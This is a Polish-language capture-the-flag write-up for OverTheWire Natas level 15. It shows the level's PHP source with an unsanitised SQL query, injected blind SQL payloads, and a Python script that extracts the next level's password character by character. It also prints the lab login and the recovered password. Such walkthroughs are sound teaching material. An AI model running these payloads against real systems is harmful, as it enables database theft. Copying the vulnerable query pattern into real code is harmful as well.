Ten poziom zawiera pole w które można wpisać nazwę użytkownika i sprawdzić czy on istnieje, poprzez otrzymanie informacji "This user exists." albo "This user doesn't exist."

Kod źródłowy:
```php
<?php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```

Z tego kodu można zauważyć, że da się ponownie zastosować sql injection w celu modyfikacji zapytania SQL. Problemem jednak jest to, że serwer nie zwraca danych z bazy, tylko odpowiada tak lub nie. Występuje tutaj podatność blind SQL injection.

W zapytaniach wykorzystałem flagę debug=1, która wypisuje treść zapytania w odpowiedzi.

Można sprawdzić z ilu znaków składa się hasło oraz każdy znak po kolei, żeby zdobyć odpowiedź.

```
Executing query: SELECT * from users where username="natas16" and CHAR_LENGTH(password) = 32 #"<br>This user exists.<br>
```

Dalej znając długość hasła, można każdy znak po kolei sprawdzić i w ten sposób zdobyć całe hasło.
```
username=natas16"+and+SUBSTRING(password,+1,+1)+%3d+"h"+%23
```
Odpowiedź:
```
Executing query: SELECT * from users where username="natas16" and SUBSTRING(password, 1, 1) = "h" #"<br>This user exists.<br>
```

Żeby uprościć proces napisałem w języku python3 skrypt, który iteruje po każdym numerze litery w haśle wszystkie znaki, jak znajdzie poprawny to iteruje od następnego pola.

```python
import requests
import string

all_chars = string.ascii_letters + string.digits

url = "http://natas15.natas.labs.overthewire.org/index.php?debug=1"

password = ""

auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

for i in range (1, 33):
      for char in all_chars:
            payload = f'natas16" and SUBSTRING(password, {i}, 1) = "{char}" #'
            data = {
                  "username": payload
            }
            response = requests.post(url, data=data, auth=auth)
            if "This user exists." in response.text[-200:]:
                  password += char
                  break
print(password)
```

Hasło to : hpkjkyvilqctew33qmuxl6edvfmw4sgo

Sprawdzenie
```
Executing query: SELECT * from users where username="natas16" and password="hpkjkyvilqctew33qmuxl6edvfmw4sgo" #"<br>This user exists.<br>
```